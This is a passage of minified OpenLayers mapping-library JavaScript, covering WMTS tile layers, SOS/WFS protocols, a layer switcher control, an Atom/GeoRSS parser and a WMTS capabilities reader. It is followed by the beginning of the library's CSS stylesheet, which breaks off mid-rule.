configuration.");a.params=OpenLayers.Util.upperCaseObject(a.params);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,a.params,a]);this.formatSuffix||(this.formatSuffix=this.formatSuffixMap[this.format]||this.format.split("/").pop());if(this.matrixIds&amp;&amp;(a=this.matrixIds.length)&amp;&amp;"string"===typeof this.matrixIds[0])for(b=this.matrixIds,this.matrixIds=Array(a),c=0;c&lt;a;++c)this.matrixIds[c]= {identifier:b[c]}},setMap:function(){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments)},updateMatrixProperties:function(){if(this.matrix=this.getMatrix())this.matrix.topLeftCorner&amp;&amp;(this.tileOrigin=this.matrix.topLeftCorner),this.matrix.tileWidth&amp;&amp;this.matrix.tileHeight&amp;&amp;(this.tileSize=new OpenLayers.Size(this.matrix.tileWidth,this.matrix.tileHeight)),this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.top)),this.tileFullExtent||(this.tileFullExtent= this.maxExtent)},moveTo:function(a,b,c){!b&amp;&amp;this.matrix||this.updateMatrixProperties();return OpenLayers.Layer.Grid.prototype.moveTo.apply(this,arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.WMTS(this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getIdentifier:function(){return this.getServerZoom()},getMatrix:function(){var a;if(this.matrixIds&amp;&amp;0!==this.matrixIds.length)if("scaleDenominator"in this.matrixIds[0])for(var b=OpenLayers.METERS_PER_INCH*OpenLayers.INCHES_PER_UNIT[this.units]* this.getServerResolution()/2.8E-4,c=Number.POSITIVE_INFINITY,d,e=0,f=this.matrixIds.length;e&lt;f;++e)d=Math.abs(1-this.matrixIds[e].scaleDenominator/b),d&lt;c&amp;&amp;(c=d,a=this.matrixIds[e]);else a=this.matrixIds[this.getIdentifier()];else a={identifier:this.getIdentifier()};return a},getTileInfo:function(a){var b=this.getServerResolution(),c=(a.lon-this.tileOrigin.lon)/(b*this.tileSize.w);a=(this.tileOrigin.lat-a.lat)/(b*this.tileSize.h);var b=Math.floor(c),d=Math.floor(a);return{col:b,row:d,i:Math.floor((c- b)*this.tileSize.w),j:Math.floor((a-d)*this.tileSize.h)}},getURL:function(a){a=this.adjustBounds(a);var b="";if(!this.tileFullExtent||this.tileFullExtent.intersectsBounds(a)){a=a.getCenterLonLat();var c=this.getTileInfo(a);a=this.dimensions;var d,b=OpenLayers.Util.isArray(this.url)?this.selectUrl([this.version,this.style,this.matrixSet,this.matrix.identifier,c.row,c.col].join(),this.url):this.url;if("REST"===this.requestEncoding.toUpperCase())if(d=this.params,-1!==b.indexOf("{")){b=b.replace(/\{/g, "${");c={style:this.style,Style:this.style,TileMatrixSet:this.matrixSet,TileMatrix:this.matrix.identifier,TileRow:c.row,TileCol:c.col};if(a){var e,f;for(f=a.length-1;0&lt;=f;--f)e=a[f],c[e]=d[e.toUpperCase()]}b=OpenLayers.String.format(b,c)}else{e=this.version+"/"+this.layer+"/"+this.style+"/";if(a)for(f=0;f&lt;a.length;f++)d[a[f]]&amp;&amp;(e=e+d[a[f]]+"/");e=e+this.matrixSet+"/"+this.matrix.identifier+"/"+c.row+"/"+c.col+"."+this.formatSuffix;b.match(/\/$/)||(b+="/");b+=e}else"KVP"===this.requestEncoding.toUpperCase()&amp;&amp; (d={SERVICE:"WMTS",REQUEST:"GetTile",VERSION:this.version,LAYER:this.layer,STYLE:this.style,TILEMATRIXSET:this.matrixSet,TILEMATRIX:this.matrix.identifier,TILEROW:c.row,TILECOL:c.col,FORMAT:this.format},b=OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,[d]))}return b},mergeNewParams:function(a){if("KVP"===this.requestEncoding.toUpperCase())return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,[OpenLayers.Util.upperCaseObject(a)])},CLASS_NAME:"OpenLayers.Layer.WMTS"});OpenLayers.Protocol.SOS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol,{fois:null,formatOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.SOSGetFeatureOfInterest(this.formatOptions))},destroy:function(){this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a,this.options|| {});var b=new OpenLayers.Protocol.Response({requestType:"read"}),c=this.format,c=OpenLayers.Format.XML.prototype.write.apply(c,[c.writeNode("sos:GetFeatureOfInterest",{fois:this.fois})]);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),data:c});return b},handleRead:function(a,b){if(b.callback){var c=a.priv;200&lt;=c.status&amp;&amp;300>c.status?(a.features=this.parseFeatures(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE; b.callback.call(b.scope,a)}},parseFeatures:function(a){var b=a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},CLASS_NAME:"OpenLayers.Protocol.SOS.v1_0_0"});OpenLayers.Layer.KaMapCache=OpenLayers.Class(OpenLayers.Layer.KaMap,{IMAGE_EXTENSIONS:{jpeg:"jpg",gif:"gif",png:"png",png8:"png",png24:"png",dithered:"png"},DEFAULT_FORMAT:"jpeg",initialize:function(a,b,c,d){OpenLayers.Layer.KaMap.prototype.initialize.apply(this,arguments);this.extension=this.IMAGE_EXTENSIONS[this.params.i.toLowerCase()||this.DEFAULT_FORMAT]},getURL:function(a){a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a= -Math.round(a.top/b);var b=Math.floor(d/this.tileSize.w/this.params.metaTileSize.w)*this.tileSize.w*this.params.metaTileSize.w,e=Math.floor(a/this.tileSize.h/this.params.metaTileSize.h)*this.tileSize.h*this.params.metaTileSize.h,c=["/",this.params.map,"/",c,"/",this.params.g.replace(/\s/g,"_"),"/def/t",e,"/l",b,"/t",a,"l",d,".",this.extension],d=this.url;OpenLayers.Util.isArray(d)&amp;&amp;(d=this.selectUrl(c.join(""),d));return d+c.join("")},CLASS_NAME:"OpenLayers.Layer.KaMapCache"});OpenLayers.Protocol.WFS.v1_1_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,{version:"1.1.0",initialize:function(a){OpenLayers.Protocol.WFS.v1.prototype.initialize.apply(this,arguments);this.outputFormat&amp;&amp;!this.readFormat&amp;&amp;("gml2"==this.outputFormat.toLowerCase()?this.readFormat=new OpenLayers.Format.GML.v2({featureType:this.featureType,featureNS:this.featureNS,geometryName:this.geometryName}):"json"==this.outputFormat.toLowerCase()&amp;&amp;(this.readFormat=new OpenLayers.Format.GeoJSON))},CLASS_NAME:"OpenLayers.Protocol.WFS.v1_1_0"});OpenLayers.Format.WMSCapabilities.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,{version:"1.1.1",readers:{wms:OpenLayers.Util.applyDefaults({SRS:function(a,b){b.srs[this.getChildValue(a)]=!0}},OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_1"});OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1_1,{version:"1.1.1",profile:"WMSC",readers:{wms:OpenLayers.Util.applyDefaults({VendorSpecificCapabilities:function(a,b){b.vendorSpecific={tileSets:[]};this.readChildNodes(a,b.vendorSpecific)},TileSet:function(a,b){var c={srs:{},bbox:{},resolutions:[]};this.readChildNodes(a,c);b.tileSets.push(c)},Resolutions:function(a,b){for(var c=this.getChildValue(a).split(" "),d=0,e=c.length;d&lt;e;d++)""!=c[d]&amp;&amp;b.resolutions.push(parseFloat(c[d]))}, Width:function(a,b){b.width=parseInt(this.getChildValue(a))},Height:function(a,b){b.height=parseInt(this.getChildValue(a))},Layers:function(a,b){b.layers=this.getChildValue(a)},Styles:function(a,b){b.styles=this.getChildValue(a)}},OpenLayers.Format.WMSCapabilities.v1_1_1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC"});OpenLayers.Control.LayerSwitcher=OpenLayers.Class(OpenLayers.Control,{layerStates:null,layersDiv:null,baseLayersDiv:null,baseLayers:null,dataLbl:null,dataLayersDiv:null,dataLayers:null,minimizeDiv:null,maximizeDiv:null,ascending:!0,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,arguments);this.layerStates=[]},destroy:function(){this.clearLayersArray("base");this.clearLayersArray("data");this.map.events.un({buttonclick:this.onButtonClick,addlayer:this.redraw,changelayer:this.redraw, removelayer:this.redraw,changebaselayer:this.redraw,scope:this});this.events.unregister("buttonclick",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.on({addlayer:this.redraw,changelayer:this.redraw,removelayer:this.redraw,changebaselayer:this.redraw,scope:this});this.outsideViewport?(this.events.attachToElement(this.div),this.events.register("buttonclick",this,this.onButtonClick)): this.map.events.register("buttonclick",this,this.onButtonClick)},draw:function(){OpenLayers.Control.prototype.draw.apply(this);this.loadContents();this.outsideViewport||this.minimizeControl();this.redraw();return this.div},onButtonClick:function(a){a=a.buttonElement;a===this.minimizeDiv?this.minimizeControl():a===this.maximizeDiv?this.maximizeControl():a._layerSwitcher===this.id&amp;&amp;(a["for"]&amp;&amp;(a=document.getElementById(a["for"])),a.disabled||("radio"==a.type?(a.checked=!0,this.map.setBaseLayer(this.map.getLayer(a._layer))): (a.checked=!a.checked,this.updateMap())))},clearLayersArray:function(a){this[a+"LayersDiv"].innerHTML="";this[a+"Layers"]=[]},checkRedraw:function(){if(!this.layerStates.length||this.map.layers.length!=this.layerStates.length)return!0;for(var a=0,b=this.layerStates.length;a&lt;b;a++){var c=this.layerStates[a],d=this.map.layers[a];if(c.name!=d.name||c.inRange!=d.inRange||c.id!=d.id||c.visibility!=d.visibility)return!0}return!1},redraw:function(){if(!this.checkRedraw())return this.div;this.clearLayersArray("base"); this.clearLayersArray("data");var a=!1,b=!1,c=this.map.layers.length;this.layerStates=Array(c);for(var d=0;d&lt;c;d++){var e=this.map.layers[d];this.layerStates[d]={name:e.name,visibility:e.visibility,inRange:e.inRange,id:e.id}}var f=this.map.layers.slice();this.ascending||f.reverse();d=0;for(c=f.length;d&lt;c;d++){var e=f[d],g=e.isBaseLayer;if(e.displayInLayerSwitcher){g?b=!0:a=!0;var h=g?e==this.map.baseLayer:e.getVisibility(),k=document.createElement("input"),l=OpenLayers.Util.createUniqueID(this.id+ "_input_");k.id=l;k.name=g?this.id+"_baseLayers":e.name;k.type=g?"radio":"checkbox";k.value=e.name;k.checked=h;k.defaultChecked=h;k.className="olButton";k._layer=e.id;k._layerSwitcher=this.id;g||e.inRange||(k.disabled=!0);h=document.createElement("label");h["for"]=k.id;OpenLayers.Element.addClass(h,"labelSpan olButton");h._layer=e.id;h._layerSwitcher=this.id;g||e.inRange||(h.style.color="gray");h.innerHTML=e.name;h.style.verticalAlign=g?"bottom":"baseline";l=document.createElement("br");(g?this.baseLayers: this.dataLayers).push({layer:e,inputElem:k,labelSpan:h});e=g?this.baseLayersDiv:this.dataLayersDiv;e.appendChild(k);e.appendChild(h);e.appendChild(l)}}this.dataLbl.style.display=a?"":"none";this.baseLbl.style.display=b?"":"none";return this.div},updateMap:function(){for(var a=0,b=this.baseLayers.length;a&lt;b;a++){var c=this.baseLayers[a];c.inputElem.checked&amp;&amp;this.map.setBaseLayer(c.layer,!1)}a=0;for(b=this.dataLayers.length;a&lt;b;a++)c=this.dataLayers[a],c.layer.setVisibility(c.inputElem.checked)},maximizeControl:function(a){this.div.style.width= "";this.div.style.height="";this.showControls(!1);null!=a&amp;&amp;OpenLayers.Event.stop(a)},minimizeControl:function(a){this.div.style.width="0px";this.div.style.height="0px";this.showControls(!0);null!=a&amp;&amp;OpenLayers.Event.stop(a)},showControls:function(a){this.maximizeDiv.style.display=a?"":"none";this.minimizeDiv.style.display=a?"none":"";this.layersDiv.style.display=a?"none":""},loadContents:function(){this.layersDiv=document.createElement("div");this.layersDiv.id=this.id+"_layersDiv";OpenLayers.Element.addClass(this.layersDiv, "layersDiv");this.baseLbl=document.createElement("div");this.baseLbl.innerHTML=OpenLayers.i18n("Base Layer");OpenLayers.Element.addClass(this.baseLbl,"baseLbl");this.baseLayersDiv=document.createElement("div");OpenLayers.Element.addClass(this.baseLayersDiv,"baseLayersDiv");this.dataLbl=document.createElement("div");this.dataLbl.innerHTML=OpenLayers.i18n("Overlays");OpenLayers.Element.addClass(this.dataLbl,"dataLbl");this.dataLayersDiv=document.createElement("div");OpenLayers.Element.addClass(this.dataLayersDiv, "dataLayersDiv");this.ascending?(this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv),this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv)):(this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv),this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv));this.div.appendChild(this.layersDiv);var a=OpenLayers.Util.getImageLocation("layer-switcher-maximize.png");this.maximizeDiv= OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_MaximizeDiv",null,null,a,"absolute");OpenLayers.Element.addClass(this.maximizeDiv,"maximizeDiv olButton");this.maximizeDiv.style.display="none";this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation("layer-switcher-minimize.png");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_MinimizeDiv",null,null,a,"absolute");OpenLayers.Element.addClass(this.minimizeDiv,"minimizeDiv olButton");this.minimizeDiv.style.display= "none";this.div.appendChild(this.minimizeDiv)},CLASS_NAME:"OpenLayers.Control.LayerSwitcher"});OpenLayers.Format.Atom=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{atom:"http://www.w3.org/2005/Atom",georss:"http://www.georss.org/georss"},feedTitle:"untitled",defaultEntryTitle:"untitled",gmlParser:null,xy:!1,read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));return this.parseFeatures(a)},write:function(a){var b;if(OpenLayers.Util.isArray(a)){b=this.createElementNSPlus("atom:feed");b.appendChild(this.createElementNSPlus("atom:title",{value:this.feedTitle})); for(var c=0,d=a.length;c&lt;d;c++)b.appendChild(this.buildEntryNode(a[c]))}else b=this.buildEntryNode(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},buildContentNode:function(a){var b=this.createElementNSPlus("atom:content",{attributes:{type:a.type||null}});if(a.src)b.setAttribute("src",a.src);else if("text"==a.type||null==a.type)b.appendChild(this.createTextNode(a.value));else if("html"==a.type){if("string"!=typeof a.value)throw"HTML content must be in form of an escaped string";b.appendChild(this.createTextNode(a.value))}else"xhtml"== a.type?b.appendChild(a.value):"xhtml"==a.type||a.type.match(/(\+|\/)xml$/)?b.appendChild(a.value):b.appendChild(this.createTextNode(a.value));return b},buildEntryNode:function(a){var b=a.attributes,c=b.atom||{},d=this.createElementNSPlus("atom:entry");if(c.authors)for(var e=OpenLayers.Util.isArray(c.authors)?c.authors:[c.authors],f=0,g=e.length;f&lt;g;f++)d.appendChild(this.buildPersonConstructNode("author",e[f]));if(c.categories)for(var e=OpenLayers.Util.isArray(c.categories)?c.categories:[c.categories], h,f=0,g=e.length;f&lt;g;f++)h=e[f],d.appendChild(this.createElementNSPlus("atom:category",{attributes:{term:h.term,scheme:h.scheme||null,label:h.label||null}}));c.content&amp;&amp;d.appendChild(this.buildContentNode(c.content));if(c.contributors)for(e=OpenLayers.Util.isArray(c.contributors)?c.contributors:[c.contributors],f=0,g=e.length;f&lt;g;f++)d.appendChild(this.buildPersonConstructNode("contributor",e[f]));a.fid&amp;&amp;d.appendChild(this.createElementNSPlus("atom:id",{value:a.fid}));if(c.links)for(e=OpenLayers.Util.isArray(c.links)? c.links:[c.links],f=0,g=e.length;f&lt;g;f++)h=e[f],d.appendChild(this.createElementNSPlus("atom:link",{attributes:{href:h.href,rel:h.rel||null,type:h.type||null,hreflang:h.hreflang||null,title:h.title||null,length:h.length||null}}));c.published&amp;&amp;d.appendChild(this.createElementNSPlus("atom:published",{value:c.published}));c.rights&amp;&amp;d.appendChild(this.createElementNSPlus("atom:rights",{value:c.rights}));(c.summary||b.description)&amp;&amp;d.appendChild(this.createElementNSPlus("atom:summary",{value:c.summary|| b.description}));d.appendChild(this.createElementNSPlus("atom:title",{value:c.title||b.title||this.defaultEntryTitle}));c.updated&amp;&amp;d.appendChild(this.createElementNSPlus("atom:updated",{value:c.updated}));a.geometry&amp;&amp;(b=this.createElementNSPlus("georss:where"),b.appendChild(this.buildGeometryNode(a.geometry)),d.appendChild(b));return d},initGmlParser:function(){this.gmlParser=new OpenLayers.Format.GML.v3({xy:this.xy,featureNS:"http://example.com#feature",internalProjection:this.internalProjection, externalProjection:this.externalProjection})},buildGeometryNode:function(a){this.gmlParser||this.initGmlParser();return this.gmlParser.writeNode("feature:_geometry",a).firstChild},buildPersonConstructNode:function(a,b){var c=["uri","email"],d=this.createElementNSPlus("atom:"+a);d.appendChild(this.createElementNSPlus("atom:name",{value:b.name}));for(var e=0,f=c.length;e&lt;f;e++)b[c[e]]&amp;&amp;d.appendChild(this.createElementNSPlus("atom:"+c[e],{value:b[c[e]]}));return d},getFirstChildValue:function(a,b,c, d){return(a=this.getElementsByTagNameNS(a,b,c))&amp;&amp;0&lt;a.length?this.getChildValue(a[0],d):d},parseFeature:function(a){var b={},c=null,d=null,e=null,f=this.namespaces.atom;this.parsePersonConstructs(a,"author",b);d=this.getElementsByTagNameNS(a,f,"category");0&lt;d.length&amp;&amp;(b.categories=[]);for(var g=0,h=d.length;g&lt;h;g++){c={};c.term=d[g].getAttribute("term");if(e=d[g].getAttribute("scheme"))c.scheme=e;if(e=d[g].getAttribute("label"))c.label=e;b.categories.push(c)}d=this.getElementsByTagNameNS(a,f,"content"); if(0&lt;d.length){c={};if(e=d[0].getAttribute("type"))c.type=e;(e=d[0].getAttribute("src"))?c.src=e:("text"==c.type||"html"==c.type||null==c.type?c.value=this.getFirstChildValue(a,f,"content",null):"xhtml"==c.type||c.type.match(/(\+|\/)xml$/)?c.value=this.getChildEl(d[0]):c.value=this.getFirstChildValue(a,f,"content",null),b.content=c)}this.parsePersonConstructs(a,"contributor",b);b.id=this.getFirstChildValue(a,f,"id",null);d=this.getElementsByTagNameNS(a,f,"link");0&lt;d.length&amp;&amp;(b.links=Array(d.length)); for(var k=["rel","type","hreflang","title","length"],g=0,h=d.length;g&lt;h;g++){c={};c.href=d[g].getAttribute("href");for(var l=0,m=k.length;l&lt;m;l++)(e=d[g].getAttribute(k[l]))&amp;&amp;(c[k[l]]=e);b.links[g]=c}if(c=this.getFirstChildValue(a,f,"published",null))b.published=c;if(c=this.getFirstChildValue(a,f,"rights",null))b.rights=c;if(c=this.getFirstChildValue(a,f,"summary",null))b.summary=c;b.title=this.getFirstChildValue(a,f,"title",null);b.updated=this.getFirstChildValue(a,f,"updated",null);c={title:b.title, description:b.summary,atom:b};a=this.parseLocations(a)[0];a=new OpenLayers.Feature.Vector(a,c);a.fid=b.id;return a},parseFeatures:function(a){var b=[],c=this.getElementsByTagNameNS(a,this.namespaces.atom,"entry");0==c.length&amp;&amp;(c=[a]);a=0;for(var d=c.length;a&lt;d;a++)b.push(this.parseFeature(c[a]));return b},parseLocations:function(a){var b=this.namespaces.georss,c={components:[]},d=this.getElementsByTagNameNS(a,b,"where");if(d&amp;&amp;0&lt;d.length){this.gmlParser||this.initGmlParser();for(var e=0,f=d.length;e&lt; f;e++)this.gmlParser.readChildNodes(d[e],c)}c=c.components;if((d=this.getElementsByTagNameNS(a,b,"point"))&amp;&amp;0&lt;d.length)for(e=0,f=d.length;e&lt;f;e++){var g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\s+/);2!=g.length&amp;&amp;(g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\s*,\s*/));c.push(new OpenLayers.Geometry.Point(g[1],g[0]))}var h=this.getElementsByTagNameNS(a,b,"line");if(h&amp;&amp;0&lt;h.length)for(var k,e=0,f=h.length;e&lt;f;e++){d=OpenLayers.String.trim(h[e].firstChild.nodeValue).split(/\s+/); k=[];for(var l=0,m=d.length;l&lt;m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.LineString(k))}if((a=this.getElementsByTagNameNS(a,b,"polygon"))&amp;&amp;0&lt;a.length)for(e=0,f=a.length;e&lt;f;e++){d=OpenLayers.String.trim(a[e].firstChild.nodeValue).split(/\s+/);k=[];l=0;for(m=d.length;l&lt;m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(k)]))}if(this.internalProjection&amp;&amp;this.externalProjection)for(e= 0,f=c.length;e&lt;f;e++)c[e]&amp;&amp;c[e].transform(this.externalProjection,this.internalProjection);return c},parsePersonConstructs:function(a,b,c){var d=[],e=this.namespaces.atom;a=this.getElementsByTagNameNS(a,e,b);for(var f=["uri","email"],g=0,h=a.length;g&lt;h;g++){var k={};k.name=this.getFirstChildValue(a[g],e,"name",null);for(var l=0,m=f.length;l&lt;m;l++){var n=this.getFirstChildValue(a[g],e,f[l],null);n&amp;&amp;(k[f[l]]=n)}d.push(k)}0&lt;d.length&amp;&amp;(c[b+"s"]=d)},CLASS_NAME:"OpenLayers.Format.Atom"});OpenLayers.Control.KeyboardDefaults=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,slideFactor:75,observeElement:null,draw:function(){this.handler=new OpenLayers.Handler.Keyboard(this,{keydown:this.defaultKeyPress},{observeElement:this.observeElement||document})},defaultKeyPress:function(a){var b,c=!0;b=OpenLayers.Event.element(a);if(!b||"INPUT"!=b.tagName&amp;&amp;"TEXTAREA"!=b.tagName&amp;&amp;"SELECT"!=b.tagName){switch(a.keyCode){case OpenLayers.Event.KEY_LEFT:this.map.pan(-this.slideFactor,0);break;case OpenLayers.Event.KEY_RIGHT:this.map.pan(this.slideFactor, 0);break;case OpenLayers.Event.KEY_UP:this.map.pan(0,-this.slideFactor);break;case OpenLayers.Event.KEY_DOWN:this.map.pan(0,this.slideFactor);break;case 33:b=this.map.getSize();this.map.pan(0,-0.75*b.h);break;case 34:b=this.map.getSize();this.map.pan(0,0.75*b.h);break;case 35:b=this.map.getSize();this.map.pan(0.75*b.w,0);break;case 36:b=this.map.getSize();this.map.pan(-0.75*b.w,0);break;case 43:case 61:case 187:case 107:this.map.zoomIn();break;case 45:case 109:case 189:case 95:this.map.zoomOut(); break;default:c=!1}c&amp;&amp;OpenLayers.Event.stop(a)}},CLASS_NAME:"OpenLayers.Control.KeyboardDefaults"});OpenLayers.Format.WMTSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1_1_0,{version:"1.0.0",namespaces:{ows:"http://www.opengis.net/ows/1.1",wmts:"http://www.opengis.net/wmts/1.0",xlink:"http://www.w3.org/1999/xlink"},yx:null,defaultPrefix:"wmts",initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a;a=OpenLayers.Util.extend({},OpenLayers.Format.WMTSCapabilities.prototype.yx);this.yx=OpenLayers.Util.extend(a,this.yx)},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);b.version=this.version;return b},readers:{wmts:{Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a,b){b.contents={};b.contents.layers=[];b.contents.tileMatrixSets={};this.readChildNodes(a,b.contents)},Layer:function(a,b){var c={styles:[],formats:[],dimensions:[],tileMatrixSetLinks:[],layers:[]};this.readChildNodes(a,c);b.layers.push(c)},Style:function(a, b){var c={};c.isDefault="true"===a.getAttribute("isDefault");this.readChildNodes(a,c);b.styles.push(c)},Format:function(a,b){b.formats.push(this.getChildValue(a))},TileMatrixSetLink:function(a,b){var c={};this.readChildNodes(a,c);b.tileMatrixSetLinks.push(c)},TileMatrixSet:function(a,b){if(b.layers){var c={matrixIds:[]};this.readChildNodes(a,c);b.tileMatrixSets[c.identifier]=c}else b.tileMatrixSet=this.getChildValue(a)},TileMatrix:function(a,b){var c={supportedCRS:b.supportedCRS};this.readChildNodes(a, c);b.matrixIds.push(c)},ScaleDenominator:function(a,b){b.scaleDenominator=parseFloat(this.getChildValue(a))},TopLeftCorner:function(a,b){var c=this.getChildValue(a).split(" "),d;b.supportedCRS&amp;&amp;(d=b.supportedCRS.replace(/urn:ogc:def:crs:(\w+):.+:(\w+)$/,"urn:ogc:def:crs:$1::$2"),d=!!this.yx[d]);b.topLeftCorner=d?new OpenLayers.LonLat(c[1],c[0]):new OpenLayers.LonLat(c[0],c[1])},TileWidth:function(a,b){b.tileWidth=parseInt(this.getChildValue(a))},TileHeight:function(a,b){b.tileHeight=parseInt(this.getChildValue(a))}, MatrixWidth:function(a,b){b.matrixWidth=parseInt(this.getChildValue(a))},MatrixHeight:function(a,b){b.matrixHeight=parseInt(this.getChildValue(a))},ResourceURL:function(a,b){b.resourceUrl=b.resourceUrl||{};var c=a.getAttribute("resourceType");b.resourceUrls||(b.resourceUrls=[]);c=b.resourceUrl[c]={format:a.getAttribute("format"),template:a.getAttribute("template"),resourceType:c};b.resourceUrls.push(c)},WSDL:function(a,b){b.wsdl={};b.wsdl.href=a.getAttribute("xlink:href")},ServiceMetadataURL:function(a, b){b.serviceMetadataUrl={};b.serviceMetadataUrl.href=a.getAttribute("xlink:href")},LegendURL:function(a,b){b.legend={};b.legend.href=a.getAttribute("xlink:href");b.legend.format=a.getAttribute("format")},Dimension:function(a,b){var c={values:[]};this.readChildNodes(a,c);b.dimensions.push(c)},Default:function(a,b){b["default"]=this.getChildValue(a)},Value:function(a,b){b.values.push(this.getChildValue(a))}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WMTSCapabilities.v1_0_0"}); style.css div.olMap { z-index: 0; padding: 0 !important; /*margin: 0 !important;*/ cursor: default; } div.olMapViewport { text-align: left; -ms-touch-action: none; } div.olLayerDiv { -moz-user-select: none; -khtml-user-select: none; } .olLayerGoogleCopyright { left: 2px; bottom: 2px; } .olLayerGoogleV3.olLayerGoogleCopyright { right: auto !important; } .olLayerGooglePoweredBy { left: 2px; bottom: 15px; } .olLayerGoogleV3.olLayerGooglePoweredBy { bottom: 15px !important; } /* GMaps should not set styles on its container */ .olForeignContainer { opacity: 1 !important; } .olControlAttribution { font-size: smaller; right: 3px; bottom: 4.5em; position: absolute; display: block; } .olControlScale { right: 3px; bottom: 3em; display: block; position: absolute; font-size: smaller; } .olControlScaleLine { display: block; position: absolute; left: 10px; bottom: 15px; font-size: xx-small; } .olControlScaleLineBottom { border: solid 2px black; border-bottom: none; margin-top:-2px; text-align: center; } .olControlScaleLineTop { border: solid 2px black; border-top: none; text-align: center; } .olControlPermalink { right: 3px; bottom: 1.5em; display: block; position: absolute; font-size: smaller; } div.olControlMousePosition { bottom: 0; right: 3px; display: block; position: absolute; font-family: Arial; font-size: smaller; } .olControlOverviewMapContainer { position: absolute; bottom: 0; right: 0; } .olControlOverviewMapElement { padding: 10px 18px 10px 10px; background-color: #00008B; -moz-border-radius: 1em 0 0 0; } .olControlOverviewMapMinimizeButton, .olControlOverviewMapMaximizeButton { height: 18px; width: 18px; right: 0; bottom: 80px; cursor: pointer; } .olControlOverviewMapExtentRectangle { overflow: hidden; background-image: url("img/blank.gif"); cursor: move; border: 2px dotted red; } .olControlOverviewMapRectReplacement { overflow: hidden; cursor: move; background-image: url("img/overview_replacement.gif"); background-repeat: no-repeat; background-position: center; } .olLayerGeoRSSDescription { float:left; width:100%; overflow:auto; font-size:1.0em; } .olLayerGeoRSSClose { float:right; color:gray; font-size:1.2em; margin-right:6px; font-family:sans-serif; } .olLayerGeoRSSTitle { float:left;font-size:1.2em; } .olPopupContent { padding:5px; overflow: auto; } .olControlNavigationHistory { background-image: url("img/navigation_history.png"); background-repeat: no-repeat; width: 24px; height: 24px; } .olControlNavigationHistoryPreviousItemActive { background-position: 0 0; } .olControlNavigationHistoryPreviousItemInactive { background-position: 0 -24px; } .olControlNavigationHistoryNextItemActive { background-position: -24px 0; } .olControlNavigationHistoryNextItemInactive { background-position: -24px -24px; } div.olControlSaveFeaturesItemActive { background-image: url(img/save_features_on.png); background-repeat: no-repeat; background-position: 0 1px; } div.olControlSaveFeaturesItemInactive { background-image: url(img/save_features_off.png); background-repeat: no-repeat; background-position: 0 1px; } .olHandlerBoxZoomBox { border: 2px solid red; position: absolute; background-color: white; opacity: 0.50; font-size: 1px; filter: alpha(opacity=50); } .olHandlerBoxSelectFeature { border: 2px solid blue; position: absolute; background-color: white; opacity: 0.50; font-size: 1px; filter: alpha(opacity=50); } .olControlPanPanel { top: 10px; left: 5px; } .olControlPanPanel div { background-image: url(img/pan-panel.png); height: 18px; width: 18px; cursor: pointer; position: absolute; } .olControlPanPanel .olControlPanNorthItemInactive { top: 0; left: 9px; background-position: 0 0; } .olControlPanPanel .olControlPanSouthItemInactive { top: 36px; left: 9px; background-position: 18px 0; } .olControlPanPanel .olControlPanWestItemInactive { position: absolute; top: 18px; left: 